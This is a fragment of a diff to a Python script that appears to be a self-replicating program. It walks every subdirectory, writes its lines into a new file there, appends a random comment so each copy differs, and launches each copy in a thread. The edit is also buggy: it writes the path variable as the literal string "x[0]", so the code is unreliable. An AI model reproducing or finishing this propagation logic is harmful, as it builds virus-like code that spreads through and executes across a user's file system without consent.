@@ -97,14 +97,14 @@ print("I made it htis far")
 for x in os.walk(directory):
     if x[0] == os.getcwd():
         continue
-    g = open(".\\" + filename, "w")
+    g = open("x[0]" + "\\" + filename, "w")
     writeIntoFile(g, lines)
     g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
     g.close()
-    thread = Thread(target=runFuncv, args=[".\\" + filename])
+    thread = Thread(target=runFuncv, args=["x[0]" + "\\" +filename])
     thread.start()
     print("I RAN PAST THIS")
-    #thread = Thread(target=runFunc, args=[x[0], filename, lines])
+    #thread = Thread(target=runFunc, args=["x[0]" + "\\" , filename, lines])
     #thread.start()
 
 # Ensure this thread gets closed
